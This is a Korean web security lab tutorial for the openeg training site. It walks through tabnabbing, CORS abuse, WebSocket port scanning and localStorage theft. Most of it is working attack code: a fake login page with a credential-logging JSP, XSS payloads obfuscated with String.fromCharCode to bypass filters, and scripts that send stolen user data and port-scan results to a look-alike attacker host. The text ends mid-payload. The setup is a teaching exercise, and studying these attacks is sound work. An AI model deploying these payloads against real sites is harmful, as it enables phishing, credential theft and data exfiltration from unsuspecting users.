### Tabnabbing

1. C:\Windows\System32\drivers\etc\hosts 파일을 관리자 권한으로 메모장에서 열어 다음과 유사하게 추가한다.

192.168.0.100 openeg.com

192.168.0.100 openeq.com

192.168.0.100 insecure.com



2. 해커머신(이클립스 openeg프로젝트>WebContent>tabnabbing>hacker 를 해커 머신으로 가정한다 )에서 404.html을 다음과 같이 작성한다

~~~html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Insert title here</title>
</head>
<body>
<h1>404 잘못된 페이지입니다</h1>
<script>
	if(window.opener){
		opener.location='http://openeq.com:8181/openeg/tabnabbing/hacker/fakeLogin.html';
	}else{
		document.querySelector("h1").innerHTML='The previous tab is safe and intact...';
	}
</script>
</body>
</html>

~~~



3. 해커머신에서 fakeLogin.html을 다음과 같이 만들어 놓는다

~~~html
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<TITLE>Login</TITLE>
<LINK href="../../css/main.css" rel="stylesheet" type="text/css">
<SCRIPT type="text/javascript">
	function checkErrCode() {
		var errCode = "";
		if (errCode != null || errCode != "") {
			switch (errCode) {
			case 1:
				alert("가입된 사용자ID가 아닙니다!");
				break;
			case 2:
				alert("비밀번호가 일치하지 않습니다!");
				break;
			case 4:
				alert("로그인후에 사용가능합니다.");
				break;
			case 3:
				alert("회원가입 처리가 완료되었습니다! 로그인 해 주세요!");
				location.href = "/openeg/login.do";
				break;
			}
		}
	}
</SCRIPT>

<META name="GENERATOR" content="MSHTML 11.00.9600.17496">
</HEAD>
<BODY onload="checkErrCode()">
	<DIV id="container">
		<H1>
			<TITLE>Insert title here</TITLE>
			<SCRIPT>
				function confirmInitDB() {
					if (confirm("정말 초기화 하시겠습니까?")) {
						return true;
					} else {
						return false;
					}
				}
			</SCRIPT>

			<DIV id="header">
				<P class="page_header">openeg.co.kr</P>
			</DIV>
			<DIV id="navigation">
				<UL>
					<LI><A href="http://openeg.com:8181/openeg/index.html">홈으로</A></LI>
					<LI><A href="http://openeg.com:8181/openeg/board/list.do">게시판</A></LI>
					<LI><A href="http://openeg.com:8181/openeg/test/test.do?no=0">보안코딩테스트</A></LI>

					<LI><A href="http://openeg.com:8181/openeg/test/esapi_test.do">ESAPI
							테스트</A></LI>
					<LI><A href="http://openid.co.kr/" target="_blank">OpenEG</A></LI>
					<LI><A href="http://cafe.naver.com/sunschool" target="_blank">SunSchool</A></LI>
					<LI><A onclick="return confirmInitDB();"
						href="http://openeg.com:8181/openeg/test/init_db.do?id=">DB초기화</A></LI>
				</UL>
			</DIV>
		</H1>
		<DIV id="content-container">
			<DIV id="content">
				<TITLE>로그인 페이지</TITLE>
				<LINK href="../../css/main.css" rel="stylesheet" type="text/css">
				<IMG width="500" height="400" src="../../img/lock.png">
			</DIV>
			<DIV id="aside">
				<FORM action="fakeLogin.jsp" method="post">
					<FIELDSET>
						<CENTER>
							<LABEL for="userId">메일주소 : </LABEL> <INPUT name="userId"
								class="loginInput" id="userId" type="text"> <SPAN
								class="error"></SPAN><BR>
							<LABEL for="userPw">비밀번호 : </LABEL> <INPUT name="userPw"
								class="loginInput" id="userPw" type="password"> <SPAN
								class="error"></SPAN><BR>
							<BR>
							<INPUT class="submitBt" type="submit" value="로그인"> <INPUT
								class="submitBt"
								onclick='window.open("member/join.do","_blank","width=400,height=400, toolbar=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no");'
								type="button" value="회원가입">
						</CENTER>
					</FIELDSET>
				</FORM>
			</DIV>
			<DIV id="footer">
				<TITLE>Insert title here</TITLE>
				<P>Copyright (C) 김영숙(yskim@openeg.co.kr), 2014</P>
			</DIV>
		</DIV>
	</DIV>
</BODY>
</HTML>
~~~



3. 해커 머신에서 fakeLogin.jsp을 다음과 같이 작성한다

~~~jsp
<%@page import="java.util.Date"%>
<%@page import="java.io.*"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
	String id = request.getParameter("userId");
	if (id == null) id = "";
	
	String pw = request.getParameter("userPw");
	if (pw == null) pw = "";
	
	String log = String.format("<br/>ID = [%s]\tPW = [%s]", new Object[] { id, pw });
	try {
		String filename= request.getSession().getServletContext().getRealPath("/log.html");
        FileWriter fw = new FileWriter(filename, true); //the true will append the new data
        fw.write(log);
        fw.close();
        
    } catch (IOException e) {
         e.printStackTrace();
    }
	System.out.println(log);
	
	response.sendRedirect("http://openeg.com:8181/openeg/login.do");
%>
~~~



5. 해커 서버를 가동시킨다.
6. 해커가 IE에서 http://openeg.com:8181/openeg/login.do로 접속하여 홍길동 계정으로 로그인 한다

7. 게시판 글쓰기에서 '재밌는 영상'이라는 제목으로 다음 내용의 글을 쓴다

~~~html
<a href='http://openeq.com:8181/openeg/tabnabbing/hacker/404.html' target='_blank'>재밌는 영상은 여기~</a>
~~~

8. 호스트머신에서 관리자가 openeg 게시판에 접속한다.
9. 재밌는 영상이라는 글을 클릭하면 '재밌는 영상은 여기~'라는 링크가 보인다
10. '링크를 클릭하면 새창이 뜨면서 404에러 페이지가 보인다.
11. 404 에러 페이지를 닫고 openeg 게시판에 복귀해보면 유사 사이트(openeq.com)로 넘어가 있다. 이를 모르고 로그인을 새로 하면 관리자 계정을 해커에게 넘기게 된다
12. 해커 서버 콘솔에 관리자 계정이 출력되는것을 확인한다
13. 호스트머신의 화면은 다시 openeg로 정상 복귀되어있어 자신의 계정이 탈취 당한 것을 모를 수 있다.



이러한 예전 tabnabbing 공격을 대비하기 위해 짜놓은 필터는 보통 a 태그에 관한 것이었다.
그런데, html5의 새 태그와 속성을 이용해 tabnabbing 공격을 하면 기존 필터를 우회할 수 있다.

( 등록할 글이 너무 길어서 컬럼 사이즈를 늘려야 함 : alter table board modify content VARCHAR(6000) ; 만약 이것이 잘 안되면 다음과 같이 수정.)

~~~sql
DROP TABLE `openeg`.`board`;

CREATE TABLE `openeg`.`board` (
	`IDX` INT NOT NULL auto_increment,
	`WRITER` VARCHAR(50) NOT NULL,
	`SUBJECT` VARCHAR(150) NOT NULL,
	`CONTENT` VARCHAR(6000) NOT NULL,
	`HITCOUNT` INT NOT NULL,
	`RECOMMENDCOUNT` INT NOT NULL,
	`WRITEDATE` DATE NOT NULL,
	`WRITERID` VARCHAR(50) NOT NULL,
	`FILENAME` VARCHAR(100),
	`SAVEDFILENAME` VARCHAR(100),
	PRIMARY KEY (`IDX`)
) ENGINE=MyISAM;

~~~



1. 해커가 글쓰기에서 '재밌는 영상2'라는 제목으로 다음 내용의 글을 쓴다

~~~js
var headTag = document.getElementsByTagName('head')[0];
var newScript = document.createElement('script');
newScript.type = 'text/javascript';
newScript.src = 'http://openeq.com:8181/openeg/tabnabbing/hacker/tabnabbing.js';
headTag.appendChild(newScript);

~~~

이 내용을 필터를 우회하기위해 decimal code로 바꾼다( https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html 사이트 이용)

~~~js
<video><source src="" onerror="eval(String.fromCharCode(118,97,114,32,104,101,97,100,84,97,103,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,59,10,118,97,114,32,110,101,119,83,99,114,105,112,116,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,10,110,101,119,83,99,114,105,112,116,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,10,110,101,119,83,99,114,105,112,116,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,111,112,101,110,101,113,46,99,111,109,58,56,49,56,49,47,111,112,101,110,101,103,47,116,97,98,110,97,98,98,105,110,103,47,104,97,99,107,101,114,47,116,97,98,110,97,98,98,105,110,103,46,106,115,39,59,10,104,101,97,100,84,97,103,46,97,112,112,101,110,100,67,104,105,108,100,40,110,101,119,83,99,114,105,112,116,41,59))"></source></video>
<a href="http://www.youtube.com/watch?v=D7gsp7RnDfc" target="new" id="a">동영상이 나타나지 않을 때는 여기를 클릭해 주세요.</a>

~~~

2. 해커 서버에 tabnabbing.js를 다음과 같은 내용으로 만들어 놓아야 한다.(희생자가 영상을 보고 있는 동안 hacker서버로 접속하도록 하는 js)

~~~js
setTimeout(function() {
	this.location='http://openeq.com:8181/openeg/tabnabbing/hacker/fakeLogin.html';
	}, 5000);

~~~

3. video 태그가 동작되는 웹브라우저(예 크롬)을 호스트머신에서 띄워 openeg 게시판을 관리자 계정으로 접속한다

4. '재밌는 영상2'라는 제목의 글을 클릭해서 영상을 보고 있는 동안 해커 서버로 접속되고 관리자는 이것을 느끼지 못하고 로그인을 해서 자신의 정보를 탈취 당하고 만다.



### CORS

####  SOP를 이해하는 실습

1. 메모장을 관리자 권한으로 연다

2. C:\Windows\System32\drivers\etc 밑의 hosts 파일을 열어 다음과 같이 추가한뒤 저장한다

~~~
127.0.0.1       localhost
192.168.0.100 openeg.com
192.168.0.100 openeq.com
192.168.0.100 insecure.com
~~~



3. WebContent>cors>insecure>에 getUserInfo.jsp를 다음과 같이 작성후 크롬 웹브라우저에서 http://insecure.com:8181/openeg/cors/insecure/getUserInfo.jsp를 요청해 보면 admin 정보가 출력된다.

~~~jsp
<%@page import="java.util.*"%><%@page import="java.io.*"%><%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
	out.println("<h1>insecure.com의 관리자 정보: id=admin pw=insecure</h1>");
%> 
~~~

4. WebContent>cors>insecure> 에 sop_test.jsp를 다음과 같이 작성 후 http://insecure.com:8181/openeg/cors/insecure/sop_test.jsp를 실행하면 버튼이 두 개 보인다.

~~~jsp
<%@page import="java.util.*"%><%@page import="java.io.*"%><%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%  out.println("{ \"id\":\"admin\", \"grade\":\"common\", \"company\":\"XXX\", \"email\":\"admin@open.com\", \"telephone\":\"010-999-00000\" }");
%> 
~~~



5. WebContent>cors>insecure> 에 sop_test.jsp를 다음과 같이 작성 후 http://insecure.com:8181/openeg/cors/insecure/sop_test.jsp를 실행하면 버튼이 두 개 보인다.

~~~jsp
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Insert title here</title>
<script src="../js/jquery-1.7.1.js"></script>

<script type="text/javascript">
var xhr;
	
	function a(){
		xhr = new XMLHttpRequest();
		var url='http://insecure.com:8181/openeg/cors/insecure/getUserInfo.jsp';
		xhr.open('GET',url);
		xhr.onload = function() {			
			alert(xhr.responseText);			
		};
		xhr.onerror = function() {
			alert('Woops, there was an error making the request.');
		};
		xhr.send();		
	}
	function b(){
		xhr = new XMLHttpRequest();
		var url='http://openeg.com:8181/openeg/cors/openeg/getUserInfo.jsp';
		xhr.open('GET',url);
		xhr.onload = function() {			
			alert(xhr.responseText);			
		};
		xhr.onerror = function() {
			alert('Woops, there was an error making the request.');
		};
		xhr.send();		
	}

</script>

</head>
<body>
<button onclick="a()" >XHR로 http://insecure.com:8181/openeg/cors/insecure/getUserInfo.jsp의 사용자 정보 보기</button><br><br>
<button onclick="b()" >XHR로 http://openeg.com:8181/openeg/cors/openeg/getUserInfo.jsp의 사용자 정보 보기</button>
</body>
</html>
~~~



6. 윗 버튼을 누르면 http://insecure.com:8181 이 오리진인 자바스크립트가 같은 스킴으로 getUserInfo.jsp를 요청하므로 사용자 정보가 잘 보인다.

7. 아래 버튼을 누르면 http://insecure.com:8181 이 오리진인 자바스크립트가 다른 스킴(openeg.com)으로 getUserInfo.jsp를 요청하므로 사용자 정보가 안 보인다.==>SOP(Same Origin Policy)때문!
8. WebContent>cors>openeg>getUserInfo.jsp 에 다음 코드를 추가해 놓는다.

~~~jsp
response.setHeader("Access-Control-Allow-Origin", "*"); 
~~~

9. http://insecure.com:8181/openeg/cors/insecure/sop_test.jsp를 실행한 뒤 모든 오리진에 대해서 제한없이 수행되는 것을 확인한다.



#### CORS를 이용한 공격

1. insecure.com 사이트와 openeg.com 사이트는 서로 신뢰 관계가 있다고 가정하고 WebContent>cors>openeg>getUserInfo.jsp에 다음 코드를 추가한다. 

~~~jsp
response.setHeader("Access-Control-Allow-Origin", "http://insecure.com:8181");
~~~

2. 해커는 openeg.com의 getUserInfo.jsp를 직접 호출할 수는 없는 상태라고 가정한다. 해커는 신뢰 관계에 있는 insecure.com의 게시판에 스크립트가 숨겨진 글을 등록한다.

~~~
글 제목 : 정말 아무 정보도 빼내가지 않아요.
글 내용 : <script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62,10,9,102,117,110,99,116,105,111,110,32,99,114,101,97,116,101,67,79,82,83,82,101,113,117,101,115,116,40,109,101,116,104,111,100,44,32,117,114,108,41,32,123,10,9,9,118,97,114,32,120,104,114,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,9,9,105,102,32,40,34,119,105,116,104,67,114,101,100,101,110,116,105,97,108,115,34,32,105,110,32,120,104,114,41,32,123,10,9,9,9,47,47,32,88,72,82,32,102,111,114,32,67,104,114,111,109,101,47,70,105,114,101,102,111,120,47,79,112,101,114,97,47,83,97,102,97,114,105,46,10,9,9,9,120,104,114,46,111,112,101,110,40,109,101,116,104,111,100,44,32,117,114,108,44,32,116,114,117,101,41,59,10,9,9,125,32,101,108,115,101,32,105,102,32,40,116,121,112,101,111,102,32,88,68,111,109,97,105,110,82,101,113,117,101,115,116,32,33,61,32,34,117,110,100,101,102,105,110,101,100,34,41,32,123,10,9,9,9,47,47,32,88,68,111,109,97,105,110,82,101,113,117,101,115,116,32,102,111,114,32,73,69,46,10,9,9,9,120,104,114,32,61,32,110,101,119,32,88,68,111,109,97,105,110,82,101,113,117,101,115,116,40,41,59,10,9,9,9,120,104,114,46,111,112,101,110,40,109,101,116,104,111,100,44,32,117,114,108,41,59,10,9,9,125,32,101,108,115,101,32,123,10,9,9,9,47,47,32,67,79,82,83,32,110,111,116,32,115,117,112,112,111,114,116,101,100,46,10,9,9,9,120,104,114,32,61,32,110,117,108,108,59,10,9,9,125,10,9,9,114,101,116,117,114,110,32,120,104,114,59,10,9,125,10,10,9,102,117,110,99,116,105,111,110,32,109,97,107,101,67,111,114,115,82,101,113,117,101,115,116,40,41,32,123,10,9,9,118,97,114,32,117,114,108,32,61,32,39,104,116,116,112,58,47,47,111,112,101,110,101,103,46,99,111,109,58,56,49,56,49,47,111,112,101,110,101,103,47,99,111,114,115,47,111,112,101,110,101,103,47,103,101,116,85,115,101,114,73,110,102,111,46,106,115,112,39,59,10,9,9,118,97,114,32,120,104,114,32,61,32,99,114,101,97,116,101,67,79,82,83,82,101,113,117,101,115,116,40,39,71,69,84,39,44,32,117,114,108,41,59,10,9,9,10,9,9,105,102,32,40,33,120,104,114,41,32,123,10,9,9,9,97,108,101,114,116,40,39,67,79,82,83,32,110,111,116,32,115,117,112,112,111,114,116,101,100,39,41,59,10,9,9,9,114,101,116,117,114,110,59,10,9,9,125,10,9,9,120,104,114,46,111,110,108,111,97,100,32,61,32,102,117,110,99,116,105,111,110,40,41,32,123,10,9,9,9,118,97,114,32,115,32,61,32,74,83,79,78,46,112,97,114,115,101,40,120,104,114,46,114,101,115,112,111,110,115,101,84,101,120,116,41,59,10,9,9,9,118,97,114,32,111,117,116,112,117,116,32,61,32,39,60,98,114,47,62,105,100,32,58,32,39,32,43,32,115,46,105,100,32,10,9,9,9,9,9,32,32,32,43,32,39,60,98,114,47,62,103,114,97,100,101,32,58,32,39,32,43,32,115,46,103,114,97,100,101,32,10,9,9,9,9,9,32,32,32,43,32,39,60,98,114,47,62,99,111,109,112,97,110,121,32,58,32,39,32,43,32,115,46,99,111,109,112,97,110,121,10,9,9,9,9,9,32,32,32,43,32,39,60,98,114,47,62,101,109,97,105,108,32,58,32,39,32,43,32,115,46,101,109,97,105,108,32,10,9,9,9,9,9,32,32,32,43,32,39,60,98,114,47,62,116,101,108,101,112,104,111,110,101,32,58,32,39,32,43,32,115,46,116,101,108,101,112,104,111,110,101,59,10,9,9,9,10,9,9,9,110,101,119,32,73,109,97,103,101,40,41,46,115,114,99,32,61,32,34,104,116,116,112,58,47,47,111,112,101,110,101,113,46,99,111,109,58,56,49,56,49,47,111,112,101,110,101,103,47,99,111,114,115,47,104,97,99,107,101,114,115,47,108,111,103,103,105,110,103,46,106,115,112,63,115,61,34,43,101,110,99,111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,40,111,117,116,112,117,116,41,59,10,9,9,125,59,10,9,9,120,104,114,46,111,110,101,114,114,111,114,32,61,32,102,117,110,99,116,105,111,110,40,41,32,123,10,9,9,9,97,108,101,114,116,40,39,87,111,111,112,115,44,32,116,104,101,114,101,32,119,97,115,32,97,110,32,101,114,114,111,114,32,109,97,107,105,110,103,32,116,104,101,32,114,101,113,117,101,115,116,46,39,41,59,10,9,9,125,59,10,9,9,120,104,114,46,115,101,110,100,40,41,59,10,9,125,10,10,9,109,97,107,101,67,111,114,115,82,101,113,117,101,115,116,40,41,59,10,60,47,115,99,114,105,112,116,62))</script>

~~~

~~~
<script>
	function createCORSRequest(method, url) {
		var xhr = new XMLHttpRequest();
		if ("withCredentials" in xhr) {
			// XHR for Chrome/Firefox/Opera/Safari.
			xhr.open(method, url, true);
		} else if (typeof XDomainRequest != "undefined") {
			// XDomainRequest for IE.
			xhr = new XDomainRequest();
			xhr.open(method, url);
		} else {
			// CORS not supported.
			xhr = null;
		}
		return xhr;
	}

	function makeCorsRequest() {
		var url = 'http://openeg.com:8181/openeg/cors/openeg/getUserInfo.jsp';
		var xhr = createCORSRequest('GET', url);
		
		if (!xhr) {
			alert('CORS not supported');
			return;
		}
		xhr.onload = function() {
			var s = JSON.parse(xhr.responseText);
			var output = '<br/>id : ' + s.id 
					   + '<br/>grade : ' + s.grade 
					   + '<br/>company : ' + s.company
					   + '<br/>email : ' + s.email 
					   + '<br/>telephone : ' + s.telephone;
			
			new Image().src = "http://openeq.com:8181/openeg/cors/hackers/logging.jsp?s="+encodeURIComponent(output);
		};
		xhr.onerror = function() {
			alert('Woops, there was an error making the request.');
		};
		xhr.send();
	}

	makeCorsRequest();
</script>

~~~

3. WebContent>cors>hackers 폴더를 만들어 해커 머신이라고 가정한 뒤 여기에 logging.jsp를 다음과 같이 작성한다.

~~~jsp
<%@page import="java.util.Date"%>
<%@page import="java.io.*"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
	String s = request.getParameter("s");
	if (s == null) s = "";

	String log = String.format("<br/><div>%s</div>", new Object[] { s });
	try {
		String filename= request.getSession().getServletContext().getRealPath("/cors/hackers/log.html");
        FileWriter fw = new FileWriter(filename); //the true will append the new data
        fw.write(log);
        fw.close();        
    } catch (IOException e) {
         e.printStackTrace();
    }
	System.out.println(log);
%>

~~~

4. 이 글을 클릭하면 XHR2를 지원하는 브라우저(크롬)라면 글 내용에 포함된 스크립트가 실행된다. 스크립트에는 openeg.com으로 getUserInfo.jsp를 요청하게 되어 있다.getUserInfo.jsp에서 insecure.com 오리진이 가능하므로 이 jsp가 수행되어 결과가 브라우저에 output 값으로 저장된 뒤 다시 hackers.com으로 사용자 정보를 전송하게된다.
5. 이클립스 output 콘솔을 해커의 콘솔로 가정하고 확인해 보면 사용자 정보가 탈취된 것을 확인할 수 있다.

### WebSocket

#### WebSocket으로 채팅 만들기

1. tomcat8.0버전(javax.websocket 지원 버전)이상 필요. 포트를 8080로 변경 
2. 이클립스 새 프로젝트를 WebSocket라는 이름으로 만들어 서버 프로그램을 다음과 같이 만든다

~~~java
package ws.server;

import java.io.IOException;
import java.util.Collections;
import java.util.HashSet;
import java.util.Set;

import javax.websocket.OnClose;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;

@ServerEndpoint("/broadcasting")
public class Broadsocket {

	private static Set<Session> clients = Collections
			.synchronizedSet(new HashSet<Session>());

	@OnMessage
	public void onMessage(String message, Session session) throws IOException {
		System.out.println(message);
		synchronized (clients) {
			// Iterate over the connected sessions
			// and broadcast the received message
			for (Session client : clients) {
				if (!client.equals(session)) {
					client.getBasicRemote().sendText(message);
				}
			}
		}
	}

	@OnOpen
	public void onOpen(Session session) {
		// Add session to the connected sessions set
		System.out.println(session);
		clients.add(session);
	}

	@OnClose
	public void onClose(Session session) {
		// Remove session from the connected sessions set
		clients.remove(session);
	}
}

~~~



3. index.html을 다음과 같이 만든다 (포트 반드시 확인!!!)

~~~html
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
    <title>Testing websockets</title>
</head>
<body>
    <fieldset>
        <textarea id="messageWindow" rows="10" cols="50" readonly="true"></textarea>
        <br/>
        <input id="inputMessage" type="text"/>
        <input type="submit" value="send" onclick="send()" />
    </fieldset>
</body>
    <script type="text/javascript">
        var textarea = document.getElementById("messageWindow");
        var webSocket = new WebSocket('ws://localhost:8080/WebSocket/broadcasting');
        var inputMessage = document.getElementById('inputMessage');
    webSocket.onerror = function(event) {
      onError(event)
    };
    webSocket.onopen = function(event) {
      onOpen(event)
    };
    webSocket.onmessage = function(event) {
      onMessage(event)
    };
    function onMessage(event) {
        textarea.value += "상대 : " + event.data + "\n";
    }
    function onOpen(event) {
        textarea.value += "연결 성공\n";
    }
    function onError(event) {
      alert(event.data);
    }
    function send() {
        textarea.value += "나 : " + inputMessage.value + "\n";
        webSocket.send(inputMessage.value);
        inputMessage.value = "";
    }
  </script>
</html>

~~~



#### WebSocket으로 포트 스캔 공격하기

1. 8181포트를 사용하는 openeg 서버의 WebContent>websocket>hackers 폴더를 만들어 해커 머신이라고 가정하고 scanner.js를 다음과 같이 작성해 놓는다.

~~~js
var active_tab = 1;
var ip = "127.0.0.1";
var start_port = "8070";
var end_port = "8090";
var blocked_ports = [0,1,7,9,11,13,15,17,19,20,21,22,23,25,37,42,43,53,77,79,87,95,101,102,103,104,109,110,111,113,115,117,119,123,135,139,143,179,389,465,512,513,514,515,526,530,531,532,540,556,563,587,601,636,993,995,2049,4045,6000];
var ws;
var start_time;
var current_port = 0;
var open_port_max = 300;
var closed_port_max = 2000;
var ps_open_ports = [];
var ps_closed_ports = [];
var ps_timeout_ports = [];

function scan_ports()
{
	current_port = 0;
	ps_open_ports = [];
	ps_closed_ports = [];
	ps_timeout_ports = [];

	reset();
	setTimeout("scan_ports_ws()", 1);
}

function scan_ports_ws()
{
	if (init_port_ps()) {
		return;
	}

	if (is_blocked(current_port)) {
	   log(current_port + " is blocked");
	   setTimeout("scan_ports_ws()", 1);
	   return;
	}

	start_time = (new Date).getTime();
	try {
		ws = new WebSocket("ws://" + ip + ":" + current_port);
		setTimeout("check_ps_ws()", 5);
	} catch(err) {
		document.getElementById('log').innerHTML += "<b>Scan stopped. Exception: " + err + "</b>";
		return;
	}
}

function check_ps_ws()
{
	var interval = (new Date).getTime() - start_time;
	if (ws.readyState == 0) {
		if (interval > closed_port_max) {
			log(current_port + " is time exceeded");
			ps_timeout_ports.push(current_port);
			setTimeout("scan_ports_ws()", 1);
		} else {
			setTimeout("check_ps_ws()", 5);
		}
	}
	else {
		if (interval < open_port_max) {
			log(current_port + " is open");
			ps_open_ports.push(current_port);
		} else {
			log(current_port + " is closed");
			ps_closed_ports.push(current_port);
		}
		setTimeout("scan_ports_ws()", 1);
	}
}

function init_port_ps()
{
	if (current_port == 0) {
		current_port = start_port;
	} 
	else if (current_port == end_port) {
		/*
		document.getElementById('resultOpen').innerHTML = ps_open_ports + "&nbsp;";
		document.getElementById('resultClosed').innerHTML = ps_closed_ports + "&nbsp;";
		document.getElementById('resultFiltered').innerHTML = ps_timeout_ports + "&nbsp;";
		*/
		new Image().src = "http://openeq.com:8181/openeg/websocket/hackers/logging.jsp?open="+encodeURIComponent(ps_open_ports)
								+"&closed="+encodeURIComponent(ps_closed_ports)
								+"&filtered="+encodeURIComponent(ps_timeout_ports);
		return true;
	}
	else {
		current_port++;
	}
	return false;
}

function is_blocked(port_no)
{
	for (var i = 0; i < blocked_ports.length; i++) {
		if (blocked_ports[i] == port_no) {
			return true;
		}
	}
	return false;
}

function log(s)
{
	document.getElementById('log').innerHTML += s + "<br/>";
}

function reset()
{
	/*
	document.getElementById('resultOpen').innerHTML = " ";
	document.getElementById('resultClosed').innerHTML = " ";
	document.getElementById('resultFiltered').innerHTML = " ";
	document.getElementById('log').innerHTML = " ";
	*/
}

scan_ports();

~~~

2. WebContent>websocket>hackers 폴더(해커 머신)에 logging.jsp를 다음과 같이 만들어 놓는다

~~~jsp
<%@page import="java.util.Date"%>
<%@page import="java.io.*"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
	String open = request.getParameter("open");
	if (open == null) open = "";

	String closed = request.getParameter("closed");
	if (closed == null) closed = "";
	
	String filtered = request.getParameter("filtered");
	if (filtered == null) filtered = "";

	String log = String.format("<br/>%s<div>%s</div><br/>%s<div>%s</div><br/>%s<div>%s</div>", 
			new Object[] { "Open Ports:", open, "Closed Ports:", closed, "Filtered Ports:", filtered });
	try {
		String filename= request.getSession().getServletContext().getRealPath("/websocket/hackers/log.html");
        FileWriter fw = new FileWriter(filename); //the true will append the new data
        fw.write(log);
        fw.close();        
    } catch (IOException e) {
         e.printStackTrace();
    }
	System.out.println(log);
%>

~~~

3. http://openeg.com:8181/openeg/login.do 게시판에 해커가 글을 등록한다

~~~
제목 : 포트 스캔을 하는 것이 절대 아닙니다 !!!
내용 : 
<br/>
Scanning...
<div id="log"></div>

<script src="http://openeq.com:8181/openeg/websocket/hackers/scanner.js"></script>

~~~



4. 어떤 희생자가 해커가 등록한 글을 읽으면 자기 머신의 사용 포트가 해커에게로 다 전송된다

5. 해커머신의 콘솔에 희생자의 포트 스캔 결과가 보인다 (희생자가 WebSocket 통신을 하고 있는 상태에서만 테스트 됨)



### WebStorage

1. 크롬 브라우저로 유투브의 영상(https://www.youtube.com/watch?v=-UCnnlkjHEA&list=RDQMZVE-3dZz_rY&index=11) 하나를 보면서 개발자 콘솔(F12)을 열어본다>Application탭의 Storage 카테고리에서 Local Storage와 Session Storage를 보면 사용자의 재생목록, 재생화면 크기, 볼륨 등의 설정 관련 정보를 볼 수 있다.
2. openeg WebContent>webstorage>writeLocalStorage.html를 다음과 같이 작성한뒤 서버를 다시 가동시키고 크롬에서 http://openeg.com:8181/openeg/webstorage/writeLocalStorage.html를 실행하면 로컬 스토리지에 정보가 저장된다.

~~~html
<script>
localStorage.lastName = "Smith";
localStorage.firstName = "James";
localStorage.grade = "A++";
localStorage.accountNumber = "123455-54647-41323"
localStorage.email = "victim@gmail.com";
localStorage.telno = "010-3422-9999";
</script>
~~~



3. WebContent>webstorage>hackers 폴더를 만들고 이를 해커머신이라고 가정한 뒤 logging.jsp를 다음과 같이 작성한다.

~~~jsp
<%@page import="java.util.Date"%>
<%@page import="java.io.*"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
	String s = request.getParameter("s");
	if (s == null) s = "";

	String log = String.format("<br/><div>%s</div>", new Object[] { s });
	try {
		String filename= request.getSession().getServletContext().getRealPath("/webstorage/hackers/log.html");
        FileWriter fw = new FileWriter(filename); //the true will append the new data
        fw.write(log);
        fw.close();        
    } catch (IOException e) {
         e.printStackTrace();
    }
	System.out.println(log);
%>

~~~



4. 해커가 http://openeg.com:8181/openeg/login.do로 접속하여 게시판에 글 등록을 한다. (등록할 글이 너무 길어서 컬럼 사이즈를 늘려야 함 : alter table board modify content VARCHAR(6000) ; )

~~~
제목 : 로컬 스토리지에 정보를 빼내가는 것이 절대 아닙니다 !!!
내용 : <br/>
<script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62,10,9,118,97,114,32,111,117,116,112,117,116,32,61,32,34,34,59,10,9,105,102,32,40,119,105,110,100,111,119,46,108,111,99,97,108,83,116,111,114,97,103,101,41,32,123,10,9,32,32,32,32,105,102,32,40,108,111,99,97,108,83,116,111,114,97,103,101,46,108,101,110,103,116,104,41,32,123,10,9,32,32,32,32,32,32,32,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,108,111,99,97,108,83,116,111,114,97,103,101,46,108,101,110,103,116,104,59,32,105,43,43,41,32,123,10,9,32,32,32,32,32,32,32,32,32,32,32,111,117,116,112,117,116,32,43,61,32,108,111,99,97,108,83,116,111,114,97,103,101,46,107,101,121,40,105,41,32,43,32,39,58,32,39,32,43,32,108,111,99,97,108,83,116,111,114,97,103,101,46,103,101,116,73,116,101,109,40,108,111,99,97,108,83,116,111,114,97,103,101,46,107,101,121,40,105,41,41,32,43,32,39,60,98,114,47,62,39,59,10,9,32,32,32,32,32,32,32,125,10,9,32,32,32,32,125,32,101,108,115,101,32,123,10,9,32,32,32,32,32,32,32,111,117,116,112,117,116,32,43,61,32,39,110,111,32,100,97,116,97,33,39,59,10,9,32,32,32,32,125,10,9,125,32,101,108,115,101,32,123,10,9,32,32,32,32,111,117,116,112,117,116,32,43,61,32,39,110,111,116,32,115,117,112,112,111,114,116,33,39,10,9,125,10,9,10,9,110,101,119,32,73,109,97,103,101,40,41,46,115,114,99,32,61,32,34,104,116,116,112,58,47,47,111,112,101,110,101,113,46,99,111,109,58,56,49,56,49,47,111,112,101,110,101,103,47,119,101,98,115,116,111,114,97,103,101,47,104,97,99,107,101,114,115,47,108,111,103,103,105,110,103,46,106,115,112,63,115,61,34,43,101,110,99,111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,40,111,117,116,112,117,116,41,59,10,60,47,1